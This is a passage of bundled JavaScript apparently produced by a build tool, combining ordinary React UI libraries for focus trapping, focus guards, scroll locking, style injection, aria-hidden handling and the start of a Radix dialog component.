          if (document.activeElement === previouslyFocusedElement) {
            focus(container);
          }
        }
      }
      return () => {
        container.removeEventListener(AUTOFOCUS_ON_MOUNT, onMountAutoFocus);
        setTimeout(() => {
          const unmountEvent = new CustomEvent(AUTOFOCUS_ON_UNMOUNT, EVENT_OPTIONS);
          container.addEventListener(AUTOFOCUS_ON_UNMOUNT, onUnmountAutoFocus);
          container.dispatchEvent(unmountEvent);
          if (!unmountEvent.defaultPrevented) {
            focus(previouslyFocusedElement ?? document.body, { select: true });
          }
          container.removeEventListener(AUTOFOCUS_ON_UNMOUNT, onUnmountAutoFocus);
          focusScopesStack.remove(focusScope);
        }, 0);
      };
    }
  }, [container, onMountAutoFocus, onUnmountAutoFocus, focusScope]);
  const handleKeyDown = React35.useCallback(
    (event) => {
      if (!loop && !trapped) return;
      if (focusScope.paused) return;
      const isTabKey = event.key === "Tab" && !event.altKey && !event.ctrlKey && !event.metaKey;
      const focusedElement = document.activeElement;
      if (isTabKey && focusedElement) {
        const container2 = event.currentTarget;
        const [first, last] = getTabbableEdges(container2);
        const hasTabbableElementsInside = first && last;
        if (!hasTabbableElementsInside) {
          if (focusedElement === container2) event.preventDefault();
        } else {
          if (!event.shiftKey && focusedElement === last) {
            event.preventDefault();
            if (loop) focus(first, { select: true });
          } else if (event.shiftKey && focusedElement === first) {
            event.preventDefault();
            if (loop) focus(last, { select: true });
          }
        }
      }
    },
    [loop, trapped, focusScope.paused]
  );
  return /* @__PURE__ */ jsx23(Primitive.div, { tabIndex: -1, ...scopeProps, ref: composedRefs, onKeyDown: handleKeyDown });
});
FocusScope.displayName = FOCUS_SCOPE_NAME;
function focusFirst2(candidates, { select = false } = {}) {
  const previouslyFocusedElement = document.activeElement;
  for (const candidate of candidates) {
    focus(candidate, { select });
    if (document.activeElement !== previouslyFocusedElement) return;
  }
}
function getTabbableEdges(container) {
  const candidates = getTabbableCandidates2(container);
  const first = findVisible(candidates, container);
  const last = findVisible(candidates.reverse(), container);
  return [first, last];
}
function getTabbableCandidates2(container) {
  const nodes = [];
  const walker = document.createTreeWalker(container, NodeFilter.SHOW_ELEMENT, {
    acceptNode: (node) => {
      const isHiddenInput = node.tagName === "INPUT" && node.type === "hidden";
      if (node.disabled || node.hidden || isHiddenInput) return NodeFilter.FILTER_SKIP;
      return node.tabIndex >= 0 ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_SKIP;
    }
  });
  while (walker.nextNode()) nodes.push(walker.currentNode);
  return nodes;
}
function findVisible(elements, container) {
  for (const element of elements) {
    if (!isHidden(element, { upTo: container })) return element;
  }
}
function isHidden(node, { upTo }) {
  if (getComputedStyle(node).visibility === "hidden") return true;
  while (node) {
    if (upTo !== void 0 && node === upTo) return false;
    if (getComputedStyle(node).display === "none") return true;
    node = node.parentElement;
  }
  return false;
}
function isSelectableInput(element) {
  return element instanceof HTMLInputElement && "select" in element;
}
function focus(element, { select = false } = {}) {
  if (element && element.focus) {
    const previouslyFocusedElement = document.activeElement;
    element.focus({ preventScroll: true });
    if (element !== previouslyFocusedElement && isSelectableInput(element) && select)
      element.select();
  }
}
var focusScopesStack = createFocusScopesStack();
function createFocusScopesStack() {
  let stack = [];
  return {
    add(focusScope) {
      const activeFocusScope = stack[0];
      if (focusScope !== activeFocusScope) {
        activeFocusScope?.pause();
      }
      stack = arrayRemove(stack, focusScope);
      stack.unshift(focusScope);
    },
    remove(focusScope) {
      stack = arrayRemove(stack, focusScope);
      stack[0]?.resume();
    }
  };
}
function arrayRemove(array, item) {
  const updatedArray = [...array];
  const index2 = updatedArray.indexOf(item);
  if (index2 !== -1) {
    updatedArray.splice(index2, 1);
  }
  return updatedArray;
}
function removeLinks(items) {
  return items.filter((item) => item.tagName !== "A");
}

// node_modules/@radix-ui/react-focus-guards/dist/index.mjs
import * as React36 from "react";
var count3 = 0;
function useFocusGuards() {
  React36.useEffect(() => {
    const edgeGuards = document.querySelectorAll("[data-radix-focus-guard]");
    document.body.insertAdjacentElement("afterbegin", edgeGuards[0] ?? createFocusGuard());
    document.body.insertAdjacentElement("beforeend", edgeGuards[1] ?? createFocusGuard());
    count3++;
    return () => {
      if (count3 === 1) {
        document.querySelectorAll("[data-radix-focus-guard]").forEach((node) => node.remove());
      }
      count3--;
    };
  }, []);
}
function createFocusGuard() {
  const element = document.createElement("span");
  element.setAttribute("data-radix-focus-guard", "");
  element.tabIndex = 0;
  element.style.outline = "none";
  element.style.opacity = "0";
  element.style.position = "fixed";
  element.style.pointerEvents = "none";
  return element;
}

// node_modules/tslib/tslib.es6.mjs
var __assign = function() {
  __assign = Object.assign || function __assign3(t) {
    for (var s, i = 1, n = arguments.length; i < n; i++) {
      s = arguments[i];
      for (var p in s) if (Object.prototype.hasOwnProperty.call(s, p)) t[p] = s[p];
    }
    return t;
  };
  return __assign.apply(this, arguments);
};
function __rest(s, e) {
  var t = {};
  for (var p in s) if (Object.prototype.hasOwnProperty.call(s, p) && e.indexOf(p) < 0)
    t[p] = s[p];
  if (s != null && typeof Object.getOwnPropertySymbols === "function")
    for (var i = 0, p = Object.getOwnPropertySymbols(s); i < p.length; i++) {
      if (e.indexOf(p[i]) < 0 && Object.prototype.propertyIsEnumerable.call(s, p[i]))
        t[p[i]] = s[p[i]];
    }
  return t;
}
function __spreadArray(to, from, pack) {
  if (pack || arguments.length === 2) for (var i = 0, l = from.length, ar; i < l; i++) {
    if (ar || !(i in from)) {
      if (!ar) ar = Array.prototype.slice.call(from, 0, i);
      ar[i] = from[i];
    }
  }
  return to.concat(ar || Array.prototype.slice.call(from));
}

// node_modules/react-remove-scroll/dist/es2015/Combination.js
import * as React43 from "react";

// node_modules/react-remove-scroll/dist/es2015/UI.js
import * as React39 from "react";

// node_modules/react-remove-scroll-bar/dist/es2015/constants.js
var zeroRightClassName = "right-scroll-bar-position";
var fullWidthClassName = "width-before-scroll-bar";
var noScrollbarsClassName = "with-scroll-bars-hidden";
var removedBarSizeVariable = "--removed-body-scroll-bar-size";

// node_modules/use-callback-ref/dist/es2015/assignRef.js
function assignRef(ref, value) {
  if (typeof ref === "function") {
    ref(value);
  } else if (ref) {
    ref.current = value;
  }
  return ref;
}

// node_modules/use-callback-ref/dist/es2015/useRef.js
import { useState as useState17 } from "react";
function useCallbackRef2(initialValue, callback) {
  var ref = useState17(function() {
    return {
      // value
      value: initialValue,
      // last callback
      callback,
      // "memoized" public interface
      facade: {
        get current() {
          return ref.value;
        },
        set current(value) {
          var last = ref.value;
          if (last !== value) {
            ref.value = value;
            ref.callback(value, last);
          }
        }
      }
    };
  })[0];
  ref.callback = callback;
  return ref.facade;
}

// node_modules/use-callback-ref/dist/es2015/useMergeRef.js
import * as React37 from "react";
var useIsomorphicLayoutEffect2 = typeof window !== "undefined" ? React37.useLayoutEffect : React37.useEffect;
var currentValues = /* @__PURE__ */ new WeakMap();
function useMergeRefs(refs, defaultValue) {
  var callbackRef = useCallbackRef2(defaultValue || null, function(newValue) {
    return refs.forEach(function(ref) {
      return assignRef(ref, newValue);
    });
  });
  useIsomorphicLayoutEffect2(function() {
    var oldValue = currentValues.get(callbackRef);
    if (oldValue) {
      var prevRefs_1 = new Set(oldValue);
      var nextRefs_1 = new Set(refs);
      var current_1 = callbackRef.current;
      prevRefs_1.forEach(function(ref) {
        if (!nextRefs_1.has(ref)) {
          assignRef(ref, null);
        }
      });
      nextRefs_1.forEach(function(ref) {
        if (!prevRefs_1.has(ref)) {
          assignRef(ref, current_1);
        }
      });
    }
    currentValues.set(callbackRef, refs);
  }, [refs]);
  return callbackRef;
}

// node_modules/use-sidecar/dist/es2015/medium.js
function ItoI(a) {
  return a;
}
function innerCreateMedium(defaults, middleware) {
  if (middleware === void 0) {
    middleware = ItoI;
  }
  var buffer = [];
  var assigned = false;
  var medium = {
    read: function() {
      if (assigned) {
        throw new Error("Sidecar: could not `read` from an `assigned` medium. `read` could be used only with `useMedium`.");
      }
      if (buffer.length) {
        return buffer[buffer.length - 1];
      }
      return defaults;
    },
    useMedium: function(data) {
      var item = middleware(data, assigned);
      buffer.push(item);
      return function() {
        buffer = buffer.filter(function(x) {
          return x !== item;
        });
      };
    },
    assignSyncMedium: function(cb) {
      assigned = true;
      while (buffer.length) {
        var cbs = buffer;
        buffer = [];
        cbs.forEach(cb);
      }
      buffer = {
        push: function(x) {
          return cb(x);
        },
        filter: function() {
          return buffer;
        }
      };
    },
    assignMedium: function(cb) {
      assigned = true;
      var pendingQueue = [];
      if (buffer.length) {
        var cbs = buffer;
        buffer = [];
        cbs.forEach(cb);
        pendingQueue = buffer;
      }
      var executeQueue = function() {
        var cbs2 = pendingQueue;
        pendingQueue = [];
        cbs2.forEach(cb);
      };
      var cycle = function() {
        return Promise.resolve().then(executeQueue);
      };
      cycle();
      buffer = {
        push: function(x) {
          pendingQueue.push(x);
          cycle();
        },
        filter: function(filter) {
          pendingQueue = pendingQueue.filter(filter);
          return buffer;
        }
      };
    }
  };
  return medium;
}
function createSidecarMedium(options) {
  if (options === void 0) {
    options = {};
  }
  var medium = innerCreateMedium(null);
  medium.options = __assign({ async: true, ssr: false }, options);
  return medium;
}

// node_modules/use-sidecar/dist/es2015/exports.js
import * as React38 from "react";
var SideCar = function(_a) {
  var sideCar = _a.sideCar, rest = __rest(_a, ["sideCar"]);
  if (!sideCar) {
    throw new Error("Sidecar: please provide `sideCar` property to import the right car");
  }
  var Target = sideCar.read();
  if (!Target) {
    throw new Error("Sidecar medium not found");
  }
  return React38.createElement(Target, __assign({}, rest));
};
SideCar.isSideCarExport = true;
function exportSidecar(medium, exported) {
  medium.useMedium(exported);
  return SideCar;
}

// node_modules/react-remove-scroll/dist/es2015/medium.js
var effectCar = createSidecarMedium();

// node_modules/react-remove-scroll/dist/es2015/UI.js
var nothing = function() {
  return;
};
var RemoveScroll = React39.forwardRef(function(props, parentRef) {
  var ref = React39.useRef(null);
  var _a = React39.useState({
    onScrollCapture: nothing,
    onWheelCapture: nothing,
    onTouchMoveCapture: nothing
  }), callbacks = _a[0], setCallbacks = _a[1];
  var forwardProps = props.forwardProps, children = props.children, className = props.className, removeScrollBar = props.removeScrollBar, enabled = props.enabled, shards = props.shards, sideCar = props.sideCar, noRelative = props.noRelative, noIsolation = props.noIsolation, inert = props.inert, allowPinchZoom = props.allowPinchZoom, _b = props.as, Container = _b === void 0 ? "div" : _b, gapMode = props.gapMode, rest = __rest(props, ["forwardProps", "children", "className", "removeScrollBar", "enabled", "shards", "sideCar", "noRelative", "noIsolation", "inert", "allowPinchZoom", "as", "gapMode"]);
  var SideCar2 = sideCar;
  var containerRef = useMergeRefs([ref, parentRef]);
  var containerProps = __assign(__assign({}, rest), callbacks);
  return React39.createElement(
    React39.Fragment,
    null,
    enabled && React39.createElement(SideCar2, { sideCar: effectCar, removeScrollBar, shards, noRelative, noIsolation, inert, setCallbacks, allowPinchZoom: !!allowPinchZoom, lockRef: ref, gapMode }),
    forwardProps ? React39.cloneElement(React39.Children.only(children), __assign(__assign({}, containerProps), { ref: containerRef })) : React39.createElement(Container, __assign({}, containerProps, { className, ref: containerRef }), children)
  );
});
RemoveScroll.defaultProps = {
  enabled: true,
  removeScrollBar: true,
  inert: false
};
RemoveScroll.classNames = {
  fullWidth: fullWidthClassName,
  zeroRight: zeroRightClassName
};

// node_modules/react-remove-scroll/dist/es2015/SideEffect.js
import * as React42 from "react";

// node_modules/react-remove-scroll-bar/dist/es2015/component.js
import * as React41 from "react";

// node_modules/react-style-singleton/dist/es2015/hook.js
import * as React40 from "react";

// node_modules/get-nonce/dist/es2015/index.js
var currentNonce;
var getNonce = function() {
  if (currentNonce) {
    return currentNonce;
  }
  if (typeof __webpack_nonce__ !== "undefined") {
    return __webpack_nonce__;
  }
  return void 0;
};

// node_modules/react-style-singleton/dist/es2015/singleton.js
function makeStyleTag() {
  if (!document)
    return null;
  var tag = document.createElement("style");
  tag.type = "text/css";
  var nonce = getNonce();
  if (nonce) {
    tag.setAttribute("nonce", nonce);
  }
  return tag;
}
function injectStyles(tag, css) {
  if (tag.styleSheet) {
    tag.styleSheet.cssText = css;
  } else {
    tag.appendChild(document.createTextNode(css));
  }
}
function insertStyleTag(tag) {
  var head = document.head || document.getElementsByTagName("head")[0];
  head.appendChild(tag);
}
var stylesheetSingleton = function() {
  var counter = 0;
  var stylesheet = null;
  return {
    add: function(style) {
      if (counter == 0) {
        if (stylesheet = makeStyleTag()) {
          injectStyles(stylesheet, style);
          insertStyleTag(stylesheet);
        }
      }
      counter++;
    },
    remove: function() {
      counter--;
      if (!counter && stylesheet) {
        stylesheet.parentNode && stylesheet.parentNode.removeChild(stylesheet);
        stylesheet = null;
      }
    }
  };
};

// node_modules/react-style-singleton/dist/es2015/hook.js
var styleHookSingleton = function() {
  var sheet = stylesheetSingleton();
  return function(styles, isDynamic) {
    React40.useEffect(function() {
      sheet.add(styles);
      return function() {
        sheet.remove();
      };
    }, [styles && isDynamic]);
  };
};

// node_modules/react-style-singleton/dist/es2015/component.js
var styleSingleton = function() {
  var useStyle = styleHookSingleton();
  var Sheet2 = function(_a) {
    var styles = _a.styles, dynamic = _a.dynamic;
    useStyle(styles, dynamic);
    return null;
  };
  return Sheet2;
};

// node_modules/react-remove-scroll-bar/dist/es2015/utils.js
var zeroGap = {
  left: 0,
  top: 0,
  right: 0,
  gap: 0
};
var parse2 = function(x) {
  return parseInt(x || "", 10) || 0;
};
var getOffset = function(gapMode) {
  var cs = window.getComputedStyle(document.body);
  var left = cs[gapMode === "padding" ? "paddingLeft" : "marginLeft"];
  var top = cs[gapMode === "padding" ? "paddingTop" : "marginTop"];
  var right = cs[gapMode === "padding" ? "paddingRight" : "marginRight"];
  return [parse2(left), parse2(top), parse2(right)];
};
var getGapWidth = function(gapMode) {
  if (gapMode === void 0) {
    gapMode = "margin";
  }
  if (typeof window === "undefined") {
    return zeroGap;
  }
  var offsets = getOffset(gapMode);
  var documentWidth = document.documentElement.clientWidth;
  var windowWidth = window.innerWidth;
  return {
    left: offsets[0],
    top: offsets[1],
    right: offsets[2],
    gap: Math.max(0, windowWidth - documentWidth + offsets[2] - offsets[0])
  };
};

// node_modules/react-remove-scroll-bar/dist/es2015/component.js
var Style = styleSingleton();
var lockAttribute = "data-scroll-locked";
var getStyles = function(_a, allowRelative, gapMode, important) {
  var left = _a.left, top = _a.top, right = _a.right, gap = _a.gap;
  if (gapMode === void 0) {
    gapMode = "margin";
  }
  return "\n  .".concat(noScrollbarsClassName, " {\n   overflow: hidden ").concat(important, ";\n   padding-right: ").concat(gap, "px ").concat(important, ";\n  }\n  body[").concat(lockAttribute, "] {\n    overflow: hidden ").concat(important, ";\n    overscroll-behavior: contain;\n    ").concat([
    allowRelative && "position: relative ".concat(important, ";"),
    gapMode === "margin" && "\n    padding-left: ".concat(left, "px;\n    padding-top: ").concat(top, "px;\n    padding-right: ").concat(right, "px;\n    margin-left:0;\n    margin-top:0;\n    margin-right: ").concat(gap, "px ").concat(important, ";\n    "),
    gapMode === "padding" && "padding-right: ".concat(gap, "px ").concat(important, ";")
  ].filter(Boolean).join(""), "\n  }\n  \n  .").concat(zeroRightClassName, " {\n    right: ").concat(gap, "px ").concat(important, ";\n  }\n  \n  .").concat(fullWidthClassName, " {\n    margin-right: ").concat(gap, "px ").concat(important, ";\n  }\n  \n  .").concat(zeroRightClassName, " .").concat(zeroRightClassName, " {\n    right: 0 ").concat(important, ";\n  }\n  \n  .").concat(fullWidthClassName, " .").concat(fullWidthClassName, " {\n    margin-right: 0 ").concat(important, ";\n  }\n  \n  body[").concat(lockAttribute, "] {\n    ").concat(removedBarSizeVariable, ": ").concat(gap, "px;\n  }\n");
};
var getCurrentUseCounter = function() {
  var counter = parseInt(document.body.getAttribute(lockAttribute) || "0", 10);
  return isFinite(counter) ? counter : 0;
};
var useLockAttribute = function() {
  React41.useEffect(function() {
    document.body.setAttribute(lockAttribute, (getCurrentUseCounter() + 1).toString());
    return function() {
      var newCounter = getCurrentUseCounter() - 1;
      if (newCounter <= 0) {
        document.body.removeAttribute(lockAttribute);
      } else {
        document.body.setAttribute(lockAttribute, newCounter.toString());
      }
    };
  }, []);
};
var RemoveScrollBar = function(_a) {
  var noRelative = _a.noRelative, noImportant = _a.noImportant, _b = _a.gapMode, gapMode = _b === void 0 ? "margin" : _b;
  useLockAttribute();
  var gap = React41.useMemo(function() {
    return getGapWidth(gapMode);
  }, [gapMode]);
  return React41.createElement(Style, { styles: getStyles(gap, !noRelative, gapMode, !noImportant ? "!important" : "") });
};

// node_modules/react-remove-scroll/dist/es2015/aggresiveCapture.js
var passiveSupported = false;
if (typeof window !== "undefined") {
  try {
    options = Object.defineProperty({}, "passive", {
      get: function() {
        passiveSupported = true;
        return true;
      }
    });
    window.addEventListener("test", options, options);
    window.removeEventListener("test", options, options);
  } catch (err) {
    passiveSupported = false;
  }
}
var options;
var nonPassive = passiveSupported ? { passive: false } : false;

// node_modules/react-remove-scroll/dist/es2015/handleScroll.js
var alwaysContainsScroll = function(node) {
  return node.tagName === "TEXTAREA";
};
var elementCanBeScrolled = function(node, overflow) {
  if (!(node instanceof Element)) {
    return false;
  }
  var styles = window.getComputedStyle(node);
  return (
    // not-not-scrollable
    styles[overflow] !== "hidden" && // contains scroll inside self
    !(styles.overflowY === styles.overflowX && !alwaysContainsScroll(node) && styles[overflow] === "visible")
  );
};
var elementCouldBeVScrolled = function(node) {
  return elementCanBeScrolled(node, "overflowY");
};
var elementCouldBeHScrolled = function(node) {
  return elementCanBeScrolled(node, "overflowX");
};
var locationCouldBeScrolled = function(axis, node) {
  var ownerDocument = node.ownerDocument;
  var current = node;
  do {
    if (typeof ShadowRoot !== "undefined" && current instanceof ShadowRoot) {
      current = current.host;
    }
    var isScrollable = elementCouldBeScrolled(axis, current);
    if (isScrollable) {
      var _a = getScrollVariables(axis, current), scrollHeight = _a[1], clientHeight = _a[2];
      if (scrollHeight > clientHeight) {
        return true;
      }
    }
    current = current.parentNode;
  } while (current && current !== ownerDocument.body);
  return false;
};
var getVScrollVariables = function(_a) {
  var scrollTop = _a.scrollTop, scrollHeight = _a.scrollHeight, clientHeight = _a.clientHeight;
  return [
    scrollTop,
    scrollHeight,
    clientHeight
  ];
};
var getHScrollVariables = function(_a) {
  var scrollLeft = _a.scrollLeft, scrollWidth = _a.scrollWidth, clientWidth = _a.clientWidth;
  return [
    scrollLeft,
    scrollWidth,
    clientWidth
  ];
};
var elementCouldBeScrolled = function(axis, node) {
  return axis === "v" ? elementCouldBeVScrolled(node) : elementCouldBeHScrolled(node);
};
var getScrollVariables = function(axis, node) {
  return axis === "v" ? getVScrollVariables(node) : getHScrollVariables(node);
};
var getDirectionFactor = function(axis, direction) {
  return axis === "h" && direction === "rtl" ? -1 : 1;
};
var handleScroll = function(axis, endTarget, event, sourceDelta, noOverscroll) {
  var directionFactor = getDirectionFactor(axis, window.getComputedStyle(endTarget).direction);
  var delta = directionFactor * sourceDelta;
  var target = event.target;
  var targetInLock = endTarget.contains(target);
  var shouldCancelScroll = false;
  var isDeltaPositive = delta > 0;
  var availableScroll = 0;
  var availableScrollTop = 0;
  do {
    if (!target) {
      break;
    }
    var _a = getScrollVariables(axis, target), position = _a[0], scroll_1 = _a[1], capacity = _a[2];
    var elementScroll = scroll_1 - capacity - directionFactor * position;
    if (position || elementScroll) {
      if (elementCouldBeScrolled(axis, target)) {
        availableScroll += elementScroll;
        availableScrollTop += position;
      }
    }
    var parent_1 = target.parentNode;
    target = parent_1 && parent_1.nodeType === Node.DOCUMENT_FRAGMENT_NODE ? parent_1.host : parent_1;
  } while (
    // portaled content
    !targetInLock && target !== document.body || // self content
    targetInLock && (endTarget.contains(target) || endTarget === target)
  );
  if (isDeltaPositive && (noOverscroll && Math.abs(availableScroll) < 1 || !noOverscroll && delta > availableScroll)) {
    shouldCancelScroll = true;
  } else if (!isDeltaPositive && (noOverscroll && Math.abs(availableScrollTop) < 1 || !noOverscroll && -delta > availableScrollTop)) {
    shouldCancelScroll = true;
  }
  return shouldCancelScroll;
};

// node_modules/react-remove-scroll/dist/es2015/SideEffect.js
var getTouchXY = function(event) {
  return "changedTouches" in event ? [event.changedTouches[0].clientX, event.changedTouches[0].clientY] : [0, 0];
};
var getDeltaXY = function(event) {
  return [event.deltaX, event.deltaY];
};
var extractRef = function(ref) {
  return ref && "current" in ref ? ref.current : ref;
};
var deltaCompare = function(x, y) {
  return x[0] === y[0] && x[1] === y[1];
};
var generateStyle = function(id2) {
  return "\n  .block-interactivity-".concat(id2, " {pointer-events: none;}\n  .allow-interactivity-").concat(id2, " {pointer-events: all;}\n");
};
var idCounter = 0;
var lockStack = [];
function RemoveScrollSideCar(props) {
  var shouldPreventQueue = React42.useRef([]);
  var touchStartRef = React42.useRef([0, 0]);
  var activeAxis = React42.useRef();
  var id2 = React42.useState(idCounter++)[0];
  var Style2 = React42.useState(styleSingleton)[0];
  var lastProps = React42.useRef(props);
  React42.useEffect(function() {
    lastProps.current = props;
  }, [props]);
  React42.useEffect(function() {
    if (props.inert) {
      document.body.classList.add("block-interactivity-".concat(id2));
      var allow_1 = __spreadArray([props.lockRef.current], (props.shards || []).map(extractRef), true).filter(Boolean);
      allow_1.forEach(function(el) {
        return el.classList.add("allow-interactivity-".concat(id2));
      });
      return function() {
        document.body.classList.remove("block-interactivity-".concat(id2));
        allow_1.forEach(function(el) {
          return el.classList.remove("allow-interactivity-".concat(id2));
        });
      };
    }
    return;
  }, [props.inert, props.lockRef.current, props.shards]);
  var shouldCancelEvent = React42.useCallback(function(event, parent) {
    if ("touches" in event && event.touches.length === 2 || event.type === "wheel" && event.ctrlKey) {
      return !lastProps.current.allowPinchZoom;
    }
    var touch = getTouchXY(event);
    var touchStart = touchStartRef.current;
    var deltaX = "deltaX" in event ? event.deltaX : touchStart[0] - touch[0];
    var deltaY = "deltaY" in event ? event.deltaY : touchStart[1] - touch[1];
    var currentAxis;
    var target = event.target;
    var moveDirection = Math.abs(deltaX) > Math.abs(deltaY) ? "h" : "v";
    if ("touches" in event && moveDirection === "h" && target.type === "range") {
      return false;
    }
    var canBeScrolledInMainDirection = locationCouldBeScrolled(moveDirection, target);
    if (!canBeScrolledInMainDirection) {
      return true;
    }
    if (canBeScrolledInMainDirection) {
      currentAxis = moveDirection;
    } else {
      currentAxis = moveDirection === "v" ? "h" : "v";
      canBeScrolledInMainDirection = locationCouldBeScrolled(moveDirection, target);
    }
    if (!canBeScrolledInMainDirection) {
      return false;
    }
    if (!activeAxis.current && "changedTouches" in event && (deltaX || deltaY)) {
      activeAxis.current = currentAxis;
    }
    if (!currentAxis) {
      return true;
    }
    var cancelingAxis = activeAxis.current || currentAxis;
    return handleScroll(cancelingAxis, parent, event, cancelingAxis === "h" ? deltaX : deltaY, true);
  }, []);
  var shouldPrevent = React42.useCallback(function(_event) {
    var event = _event;
    if (!lockStack.length || lockStack[lockStack.length - 1] !== Style2) {
      return;
    }
    var delta = "deltaY" in event ? getDeltaXY(event) : getTouchXY(event);
    var sourceEvent = shouldPreventQueue.current.filter(function(e) {
      return e.name === event.type && (e.target === event.target || event.target === e.shadowParent) && deltaCompare(e.delta, delta);
    })[0];
    if (sourceEvent && sourceEvent.should) {
      if (event.cancelable) {
        event.preventDefault();
      }
      return;
    }
    if (!sourceEvent) {
      var shardNodes = (lastProps.current.shards || []).map(extractRef).filter(Boolean).filter(function(node) {
        return node.contains(event.target);
      });
      var shouldStop = shardNodes.length > 0 ? shouldCancelEvent(event, shardNodes[0]) : !lastProps.current.noIsolation;
      if (shouldStop) {
        if (event.cancelable) {
          event.preventDefault();
        }
      }
    }
  }, []);
  var shouldCancel = React42.useCallback(function(name, delta, target, should) {
    var event = { name, delta, target, should, shadowParent: getOutermostShadowParent(target) };
    shouldPreventQueue.current.push(event);
    setTimeout(function() {
      shouldPreventQueue.current = shouldPreventQueue.current.filter(function(e) {
        return e !== event;
      });
    }, 1);
  }, []);
  var scrollTouchStart = React42.useCallback(function(event) {
    touchStartRef.current = getTouchXY(event);
    activeAxis.current = void 0;
  }, []);
  var scrollWheel = React42.useCallback(function(event) {
    shouldCancel(event.type, getDeltaXY(event), event.target, shouldCancelEvent(event, props.lockRef.current));
  }, []);
  var scrollTouchMove = React42.useCallback(function(event) {
    shouldCancel(event.type, getTouchXY(event), event.target, shouldCancelEvent(event, props.lockRef.current));
  }, []);
  React42.useEffect(function() {
    lockStack.push(Style2);
    props.setCallbacks({
      onScrollCapture: scrollWheel,
      onWheelCapture: scrollWheel,
      onTouchMoveCapture: scrollTouchMove
    });
    document.addEventListener("wheel", shouldPrevent, nonPassive);
    document.addEventListener("touchmove", shouldPrevent, nonPassive);
    document.addEventListener("touchstart", scrollTouchStart, nonPassive);
    return function() {
      lockStack = lockStack.filter(function(inst) {
        return inst !== Style2;
      });
      document.removeEventListener("wheel", shouldPrevent, nonPassive);
      document.removeEventListener("touchmove", shouldPrevent, nonPassive);
      document.removeEventListener("touchstart", scrollTouchStart, nonPassive);
    };
  }, []);
  var removeScrollBar = props.removeScrollBar, inert = props.inert;
  return React42.createElement(
    React42.Fragment,
    null,
    inert ? React42.createElement(Style2, { styles: generateStyle(id2) }) : null,
    removeScrollBar ? React42.createElement(RemoveScrollBar, { noRelative: props.noRelative, gapMode: props.gapMode }) : null
  );
}
function getOutermostShadowParent(node) {
  var shadowParent = null;
  while (node !== null) {
    if (node instanceof ShadowRoot) {
      shadowParent = node.host;
      node = node.host;
    }
    node = node.parentNode;
  }
  return shadowParent;
}

// node_modules/react-remove-scroll/dist/es2015/sidecar.js
var sidecar_default = exportSidecar(effectCar, RemoveScrollSideCar);

// node_modules/react-remove-scroll/dist/es2015/Combination.js
var ReactRemoveScroll = React43.forwardRef(function(props, ref) {
  return React43.createElement(RemoveScroll, __assign({}, props, { ref, sideCar: sidecar_default }));
});
ReactRemoveScroll.classNames = RemoveScroll.classNames;
var Combination_default = ReactRemoveScroll;

// node_modules/aria-hidden/dist/es2015/index.js
var getDefaultParent = function(originalTarget) {
  if (typeof document === "undefined") {
    return null;
  }
  var sampleTarget = Array.isArray(originalTarget) ? originalTarget[0] : originalTarget;
  return sampleTarget.ownerDocument.body;
};
var counterMap = /* @__PURE__ */ new WeakMap();
var uncontrolledNodes = /* @__PURE__ */ new WeakMap();
var markerMap = {};
var lockCount = 0;
var unwrapHost = function(node) {
  return node && (node.host || unwrapHost(node.parentNode));
};
var correctTargets = function(parent, targets) {
  return targets.map(function(target) {
    if (parent.contains(target)) {
      return target;
    }
    var correctedTarget = unwrapHost(target);
    if (correctedTarget && parent.contains(correctedTarget)) {
      return correctedTarget;
    }
    console.error("aria-hidden", target, "in not contained inside", parent, ". Doing nothing");
    return null;
  }).filter(function(x) {
    return Boolean(x);
  });
};
var applyAttributeToOthers = function(originalTarget, parentNode, markerName, controlAttribute) {
  var targets = correctTargets(parentNode, Array.isArray(originalTarget) ? originalTarget : [originalTarget]);
  if (!markerMap[markerName]) {
    markerMap[markerName] = /* @__PURE__ */ new WeakMap();
  }
  var markerCounter = markerMap[markerName];
  var hiddenNodes = [];
  var elementsToKeep = /* @__PURE__ */ new Set();
  var elementsToStop = new Set(targets);
  var keep = function(el) {
    if (!el || elementsToKeep.has(el)) {
      return;
    }
    elementsToKeep.add(el);
    keep(el.parentNode);
  };
  targets.forEach(keep);
  var deep = function(parent) {
    if (!parent || elementsToStop.has(parent)) {
      return;
    }
    Array.prototype.forEach.call(parent.children, function(node) {
      if (elementsToKeep.has(node)) {
        deep(node);
      } else {
        try {
          var attr = node.getAttribute(controlAttribute);
          var alreadyHidden = attr !== null && attr !== "false";
          var counterValue = (counterMap.get(node) || 0) + 1;
          var markerValue = (markerCounter.get(node) || 0) + 1;
          counterMap.set(node, counterValue);
          markerCounter.set(node, markerValue);
          hiddenNodes.push(node);
          if (counterValue === 1 && alreadyHidden) {
            uncontrolledNodes.set(node, true);
          }
          if (markerValue === 1) {
            node.setAttribute(markerName, "true");
          }
          if (!alreadyHidden) {
            node.setAttribute(controlAttribute, "true");
          }
        } catch (e) {
          console.error("aria-hidden: cannot operate on ", node, e);
        }
      }
    });
  };
  deep(parentNode);
  elementsToKeep.clear();
  lockCount++;
  return function() {
    hiddenNodes.forEach(function(node) {
      var counterValue = counterMap.get(node) - 1;
      var markerValue = markerCounter.get(node) - 1;
      counterMap.set(node, counterValue);
      markerCounter.set(node, markerValue);
      if (!counterValue) {
        if (!uncontrolledNodes.has(node)) {
          node.removeAttribute(controlAttribute);
        }
        uncontrolledNodes.delete(node);
      }
      if (!markerValue) {
        node.removeAttribute(markerName);
      }
    });
    lockCount--;
    if (!lockCount) {
      counterMap = /* @__PURE__ */ new WeakMap();
      counterMap = /* @__PURE__ */ new WeakMap();
      uncontrolledNodes = /* @__PURE__ */ new WeakMap();
      markerMap = {};
    }
  };
};
var hideOthers = function(originalTarget, parentNode, markerName) {
  if (markerName === void 0) {
    markerName = "data-aria-hidden";
  }
  var targets = Array.from(Array.isArray(originalTarget) ? originalTarget : [originalTarget]);
  var activeParentNode = parentNode || getDefaultParent(originalTarget);
  if (!activeParentNode) {
    return function() {
      return null;
    };
  }
  targets.push.apply(targets, Array.from(activeParentNode.querySelectorAll("[aria-live], script")));
  return applyAttributeToOthers(targets, activeParentNode, markerName, "aria-hidden");
};

// node_modules/@radix-ui/react-dialog/dist/index.mjs
import { Fragment as Fragment6, jsx as jsx24, jsxs as jsxs5 } from "react/jsx-runtime";
var DIALOG_NAME = "Dialog";
var [createDialogContext, createDialogScope] = createContextScope(DIALOG_NAME);
var [DialogProvider, useDialogContext] = createDialogContext(DIALOG_NAME);
var Dialog = (props) => {
  const {
    __scopeDialog,
    children,
    open: openProp,
    defaultOpen,
    onOpenChange,
    modal = true
  } = props;
